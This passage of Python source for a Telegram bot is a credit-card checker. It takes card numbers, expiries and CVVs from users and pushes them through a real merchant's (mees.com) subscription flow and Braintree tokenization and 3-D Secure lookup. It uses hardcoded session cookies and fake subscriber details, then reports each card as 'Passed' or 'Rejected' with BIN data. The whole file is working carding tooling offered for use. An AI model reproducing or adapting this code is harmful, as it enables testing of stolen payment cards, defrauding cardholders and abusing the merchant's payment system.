		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		
		n = cc.split("|")[0]
		mm = cc.split("|")[1]
		yy = cc.split("|")[2]
		cvc = cc.split("|")[3]
		
		import requests,re,base64
		r = requests.session()
		
		headers = {
    'authority': 'www.mees.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'referer': 'https://www.mees.com/subscribe/billing-info?type=basic',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
		
		response = requests.get('https://www.mees.com/subscribe/billing-info', headers=headers)
		
		token = re.search(r'name="_token" value="(.*?)"', response.text).group(1)
		
		import requests
		
		cookies = {
    '_ga': 'GA1.2.1941420049.1726836597',
    '_gid': 'GA1.2.1382059762.1726836597',
    '_gat_UA-20440204-1': '1',
    '_ga_Q5EHN8MHYB': 'GS1.2.1726836598.1.1.1726837030.39.0.0',
    'XSRF-TOKEN': 'eyJpdiI6InF1czJ6UXE5ZFJkb1RRMVNPT3NCcXc9PSIsInZhbHVlIjoiamxNU1IzS1NNS3RXdEFia2x4M1wvbVlWell1ZTFKekpOd0pPZXY1RXhIa0ZoNkRDMWdMU09DR1V4XC8zK3h6UXdwIiwibWFjIjoiNWVhYzU2MDFkMWYyNjY4MzcyYjc0NWJmNWI3MTM4NmEyZDVhYTY3MDI2NTA1NDJhNGRhNmQzMjlmMzU5NGM1ZCJ9',
    'mees_session': 'eyJpdiI6InVFV0tmc1lkSkJCRzFaWFhXRkt0VGc9PSIsInZhbHVlIjoia29VdVE2ZFRlenJSNVI1SURwcHVZZ1wvdTZ1NGNQUnZcL2dTN1lrb1g4SWtiVFFGMEk5MEZQWHdQMldaZVwvNEhcL3YiLCJtYWMiOiIwYjYyYWRjMDQ0YTFhZjM2MTBkMjg2ODljNmMxOTUzMmY4NDA3NWZlZDk4MmIwYTAxMDJmOTlmZjI2NDRlOGIxIn0%3D',
}
		
		headers = {
    'authority': 'www.mees.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': '_ga=GA1.2.1941420049.1726836597; _gid=GA1.2.1382059762.1726836597; _gat_UA-20440204-1=1; _ga_Q5EHN8MHYB=GS1.2.1726836598.1.1.1726837030.39.0.0; XSRF-TOKEN=eyJpdiI6InF1czJ6UXE5ZFJkb1RRMVNPT3NCcXc9PSIsInZhbHVlIjoiamxNU1IzS1NNS3RXdEFia2x4M1wvbVlWell1ZTFKekpOd0pPZXY1RXhIa0ZoNkRDMWdMU09DR1V4XC8zK3h6UXdwIiwibWFjIjoiNWVhYzU2MDFkMWYyNjY4MzcyYjc0NWJmNWI3MTM4NmEyZDVhYTY3MDI2NTA1NDJhNGRhNmQzMjlmMzU5NGM1ZCJ9; mees_session=eyJpdiI6InVFV0tmc1lkSkJCRzFaWFhXRkt0VGc9PSIsInZhbHVlIjoia29VdVE2ZFRlenJSNVI1SURwcHVZZ1wvdTZ1NGNQUnZcL2dTN1lrb1g4SWtiVFFGMEk5MEZQWHdQMldaZVwvNEhcL3YiLCJtYWMiOiIwYjYyYWRjMDQ0YTFhZjM2MTBkMjg2ODljNmMxOTUzMmY4NDA3NWZlZDk4MmIwYTAxMDJmOTlmZjI2NDRlOGIxIn0%3D',
    'pragma': 'no-cache',
    'referer': 'https://www.mees.com/subscribe/billing-info?type=basic',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
		
		params = {
    'type': 'basic',
    'title': 'Mr',
    'first_name': 'Salam',
    'last_name': 'Hunter',
    'email': 'salam1234@hi2.in',
    'telephone': '18504509898',
    'business_title': 'Salam Hunter',
    'department': 'Hdb',
    'company': 'Salam Hunter',
    'address_line_1': '409 New York',
    'address_line_2': 'Etc',
    'postcode': '10080',
    'city': 'New York',
    'state': 'NY',
    'country': 'US',
    'delivery': 'email',
}

		
		response = requests.get('https://www.mees.com/subscribe/payment', params=params, cookies=cookies, headers=headers)
		
		enc = response.text.split("var authorization = '")[1].split("'")[0]
		dec = base64.b64decode(enc).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
		
		import requests
		
		headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
		
		json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'c1257b52-063b-49ef-9809-0fbb425b2423',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
		
		response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
		tok = response.json()['data']['tokenizeCreditCard']['token']
		
		import requests
		
		headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://www.mees.com',
    'pragma': 'no-cache',
    'referer': 'https://www.mees.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

		
		json_data = {
    'amount': '3300',
    'additionalInfo': {},
    'bin': cc[:6],
    'dfReferenceId': '1_a93f4364-b372-4031-a2cc-76b949dbfeb9',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.85.2',
        'cardinalDeviceDataCollectionTimeElapsed': 1061,
        'issuerDeviceDataCollectionTimeElapsed': 1400,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': f'{au}',
    'braintreeLibraryVersion': 'braintree/web/3.85.2',
    '_meta': {
        'merchantAppId': 'www.mees.com',
        'platform': 'web',
        'sdkVersion': '3.85.2',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': 'c1257b52-063b-49ef-9809-0fbb425b2423',
    },
}
		
		response = requests.post(
    f'https://api.braintreegateway.com/merchants/x3k7wk95d8kbcwd4/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)



		
		last = response.json()['paymentMethod']['threeDSecureInfo']['status']
		
		
    
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝙋𝙖𝙨𝙨𝙚𝙙 ✅
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {card_type} - {brand}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝘽𝙞𝙣 ➼ {cc[:6]}
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Barry_op</b>'''
	msgd=f'''<b>𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝙄𝙣𝙛𝙤 ➼ {card_type} - {brand}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
𝘽𝙞𝙣 ➼ {cc[:6]}
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ {bank}
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Barry_op</b>'''
	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last or 'authenticate_attempt_successful' in last:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	id=call.from_user.id
	stopuser[f'{id}']['status'] = 'stop'
print("تم تشغيل البوت")
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print(f"حدث خطأ: {e}")
